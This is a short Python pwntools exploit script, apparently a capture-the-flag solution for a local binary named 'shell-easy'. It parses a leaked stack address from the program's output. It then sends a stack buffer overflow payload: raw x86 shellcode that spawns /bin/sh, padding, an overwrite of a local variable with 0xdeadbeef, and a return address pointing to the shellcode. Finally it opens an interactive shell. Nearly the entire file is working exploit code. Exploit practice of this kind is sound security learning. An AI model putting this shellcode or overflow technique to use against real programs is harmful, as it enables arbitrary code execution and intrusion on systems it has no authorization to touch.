from pwn import *

target = process('./shell-easy')

leak = target.recvline()
leak = leak.strip(b"Yeah I'll have a ")
leak = leak.strip(b" with a side of fries thanks\n")

shellcodeAdr = int(leak, 16)

#print(shellcodeAdr)

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Pad the rest of the space to local var (0xcafebabe)
payload += b"0"*(0x40 - len(payload))

payload += p32(0xdeadbeef) # Overwrite the local_c variable with 0xdeadbeef
payload += b"1"* 0x8 # Padding to the return address
payload += p32(shellcodeAdr) # Overwrite the return address to point to the start of our shellcode

# Send the payload
target.sendline(payload)
target.interactive()
